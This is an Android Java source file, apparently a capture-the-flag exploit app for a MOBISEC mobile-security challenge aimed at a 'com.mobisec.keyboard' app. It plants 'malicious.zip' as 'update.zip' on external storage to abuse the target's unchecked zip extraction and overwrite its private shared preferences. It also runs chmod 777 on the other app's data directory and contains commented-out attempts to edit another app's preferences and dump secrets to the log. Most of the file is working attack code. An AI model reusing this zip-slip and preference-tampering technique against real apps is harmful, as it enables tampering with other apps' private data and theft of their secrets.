package com.example.keyboard;

import androidx.appcompat.app.AppCompatActivity;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class MainActivity extends AppCompatActivity {

    private static boolean DEFAULT_DEBUG_MODE = true;
    private static String MY_PREFS_NAME = "KeyboardPrefs";
    private static String GLOBAL_PREFS_NAME = "GlobalKeyboardPrefs";
    private static String INFO_PREFS_NAME = "InfoKeyboardPrefs";
    private String storage = Environment.getExternalStorageDirectory().toString();


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
/*
        SharedPreferences.Editor editor = getSharedPreferences(MY_PREFS_NAME, 0).edit();
        editor.putBoolean("debugmode", DEFAULT_DEBUG_MODE);
        editor.commit();
        SharedPreferences.Editor editor2 = getSharedPreferences(INFO_PREFS_NAME, 0).edit();
        editor2.putString("author", "reyammer");
        editor2.putBoolean("debugmode", true);
        editor2.commit();
*/
        /*
        String otherAppPackageName = "com.mobisec.keyboard";
        Context otherAppContext = null;
        try {
            otherAppContext = this.createPackageContext(otherAppPackageName, Context.CONTEXT_IGNORE_SECURITY);
        } catch (PackageManager.NameNotFoundException e) {
            Log.i("MOBISEC", "CONTEXT ERROR: " + e.toString());
        }
        if (otherAppContext != null) {
            Log.i("MOBISEC", "Changing preferences...");
            SharedPreferences otherAppPreferences = otherAppContext.getSharedPreferences(MY_PREFS_NAME, Context.MODE_PRIVATE);
            SharedPreferences.Editor editor3 = otherAppPreferences.edit();
            editor3.putBoolean("debugmode", true);
            editor3.commit();
        }
        Log.i("MOBISEC", "Getting flag...");
        SharedPreferences prefs = MainActivity.this.getSharedPreferences(MainActivity.INFO_PREFS_NAME, 0);
        String flag = prefs.getString("flag", "flagnotfound");
         */
        insertZIP("GlobalPrefs.zip", "update.zip");
        try {
            Thread.sleep(5000);
        } catch (Exception e) {
            Log.e("MOBISEC", e.toString());
        }
        insertZIP("malicious.zip","update.zip");
        /*
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() { // from class: com.mobisec.keyboard.MainActivity.2
            @Override // java.util.TimerTask, java.lang.Runnable
            public void run() {
                // MainActivity.checkForUpdates();
                File zipFile = new File(Environment.getExternalStorageDirectory(), "update.zip");
                if (!zipFile.exists()) {
                    Log.i("MOBISEC", "The zip doesn´t exist");
                    return;
                }
                try {
                    Log.i("MOBISEC", "Extracting zip...");
                    extractFolder(zipFile.getAbsolutePath());
                    Log.i("MOBISEC", "Extracted");
                } catch (Exception e) {
                    e = e;
                    Log.e("MOBISEC", "Exception while extracting the zip:" + Log.getStackTraceString(e));
                    SharedPreferences myprefs = getSharedPreferences(MY_PREFS_NAME, 0);
                    SharedPreferences globprefs = getSharedPreferences(GLOBAL_PREFS_NAME, 0);
                    SharedPreferences infoprefs = getSharedPreferences(INFO_PREFS_NAME, 0);
                    SharedPreferences.Editor editor = globprefs.edit();
                    int crashes = globprefs.getInt("crashes", 0);
                    editor.putInt("crashes", crashes + 1);
                    editor.commit();
                    boolean debugMode = myprefs.getBoolean("debugmode", false);
                    boolean globDebugMode = globprefs.getBoolean("debugmode", false);
                    if (debugMode || globDebugMode) {
                        Log.e("MOBISEC", "dumping all info for debugging");
                        Map<String, ?> allEntries = myprefs.getAll();
                        for (Map.Entry<String, ?> entry : allEntries.entrySet()) {
                            Log.e("MOBISEC", entry.getKey() + ": " + entry.getValue().toString());
                            e = e;
                        }
                        Map<String, ?> allEntries2 = globprefs.getAll();
                        for (Map.Entry<String, ?> entry2 : allEntries2.entrySet()) {
                            Log.e("MOBISEC", entry2.getKey() + ": " + entry2.getValue().toString());
                        }
                        Map<String, ?> allEntries3 = infoprefs.getAll();
                        for (Map.Entry<String, ?> entry3 : allEntries3.entrySet()) {
                            Log.e("MOBISEC", entry3.getKey() + ": " + entry3.getValue().toString());
                        }
                    }
                }
            }
        }, 2000L, 5000L);
         */
    }
    public void setPreferences(){
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"chmod", "777", "/data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml"});
            proc.waitFor();
            proc = Runtime.getRuntime().exec(new String[]{"chmod", "777", "/data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml"});
            proc.waitFor();
            proc = Runtime.getRuntime().exec(new String[]{"chmod", "777", "/data/data/com.mobisec.keyboard"});
            proc.waitFor();
        }catch(Exception e){
                Log.e("MOBISEC", "Exception while chmod: " + Log.getStackTraceString(e));
        }
        String otherAppPackageName = "com.mobisec.keyboard";
        byte[] bytes = new byte[0];
        try {
            InputStream input = this.getAssets().open("GlobalKeyboardPrefs.zip");
            BufferedInputStream bufferedInputStream = new BufferedInputStream(input);
            byte[] auxbuffer = new byte[1024];
            int totalBytesRead = 0;
            int bytesRead;
            while ((bytesRead = bufferedInputStream.read(auxbuffer)) != -1) {
                totalBytesRead += bytesRead;
            }

            Log.i("MOBISEC", "File length: " + totalBytesRead);
            bytes = new byte[totalBytesRead];
            InputStream input2 = this.getAssets().open("GlobalKeyboardPrefs.zip");
            BufferedInputStream buf = new BufferedInputStream(input2);
            buf.read(bytes, 0, bytes.length);
            buf.close();

            File file1 = new File(Environment.getDataDirectory() + "/data/com.mobisec.keyboard/shared_prefs", "GlobalKeyboardPrefs.zip");
            Log.i("MOBISEC", "The error is between HERE");
            FileOutputStream fileOutput1 = new FileOutputStream(file1);
            Log.i("MOBISEC", "and HERE");
            fileOutput1.write(bytes);
            fileOutput1.flush();
            fileOutput1.close();


        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while modifying preferences: " + Log.getStackTraceString(e));
        }

    }

    public void insertZIP(String name, String outName){
        byte[] bytes = new byte[0];
        try {
            InputStream input = this.getAssets().open(name);
            BufferedInputStream bufferedInputStream = new BufferedInputStream(input);
            byte[] auxbuffer = new byte[1024];
            int totalBytesRead = 0;
            int bytesRead;
            while ((bytesRead = bufferedInputStream.read(auxbuffer)) != -1) {
                totalBytesRead += bytesRead;
            }

            Log.i("MOBISEC", "File length: " + totalBytesRead);
            bytes = new byte[totalBytesRead];
            InputStream input2 = this.getAssets().open(name);
            BufferedInputStream buf = new BufferedInputStream(input2);
            buf.read(bytes, 0, bytes.length);
            buf.close();

            File file1 = new File(storage, outName);

            FileOutputStream fileOutput1 = new FileOutputStream(file1);
            fileOutput1.write(bytes);
            fileOutput1.flush();
            fileOutput1.close();

        } catch (Exception e) {
            Log.e("MOBISEC", "Exception while downloading malicious: " + Log.getStackTraceString(e));
        }
    }

    public void checkForUpdates() {
        File zipFile = new File(Environment.getExternalStorageDirectory(), "update.zip");
        if (!zipFile.exists()) {
            return;
        }
        try {
            extractFolder(zipFile.getAbsolutePath());
        } catch (Exception e) {
            e = e;
            Log.e("MOBISEC", "Exception while extracting the zip:" + Log.getStackTraceString(e));
            SharedPreferences myprefs = getSharedPreferences(MY_PREFS_NAME, 0);
            SharedPreferences globprefs = getSharedPreferences(GLOBAL_PREFS_NAME, 0);
            SharedPreferences infoprefs = getSharedPreferences(INFO_PREFS_NAME, 0);
            SharedPreferences.Editor editor = globprefs.edit();
            int crashes = globprefs.getInt("crashes", 0);
            editor.putInt("crashes", crashes + 1);
            editor.commit();
            boolean debugMode = myprefs.getBoolean("debugmode", false);
            boolean globDebugMode = globprefs.getBoolean("debugmode", false);
            if (debugMode || globDebugMode) {
                Log.e("MOBISEC", "dumping all info for debugging");
                Map<String, ?> allEntries = myprefs.getAll();
                for (Map.Entry<String, ?> entry : allEntries.entrySet()) {
                    Log.e("MOBISEC", entry.getKey() + ": " + entry.getValue().toString());
                    e = e;
                }
                Map<String, ?> allEntries2 = globprefs.getAll();
                for (Map.Entry<String, ?> entry2 : allEntries2.entrySet()) {
                    Log.e("MOBISEC", entry2.getKey() + ": " + entry2.getValue().toString());
                }
                Map<String, ?> allEntries3 = infoprefs.getAll();
                for (Map.Entry<String, ?> entry3 : allEntries3.entrySet()) {
                    Log.e("MOBISEC", entry3.getKey() + ": " + entry3.getValue().toString());
                }
            }
        }
    }

    public static void extractFolder(String zipFilePath) throws Exception {
        System.out.println(zipFilePath);
        File zipFile = new File(zipFilePath);
        ZipFile zip = new ZipFile(zipFile);
        String destDir = zipFile.getParent();
        Enumeration zipFileEntries = zip.entries();
        while (zipFileEntries.hasMoreElements()) {
            ZipEntry entry = (ZipEntry) zipFileEntries.nextElement();
            String currentEntry = entry.getName();
            File destFile = new File(destDir, currentEntry);
            BufferedInputStream is = new BufferedInputStream(zip.getInputStream(entry));
            byte[] data = new byte[2048];
            FileOutputStream fos = new FileOutputStream(destFile);
            BufferedOutputStream dest = new BufferedOutputStream(fos, 2048);
            while (true) {
                int currentByte = is.read(data, 0, 2048);
                if (currentByte == -1) {
                    break;
                }
                dest.write(data, 0, currentByte);
            }
            dest.flush();
            dest.close();
            is.close();
        }
    }

}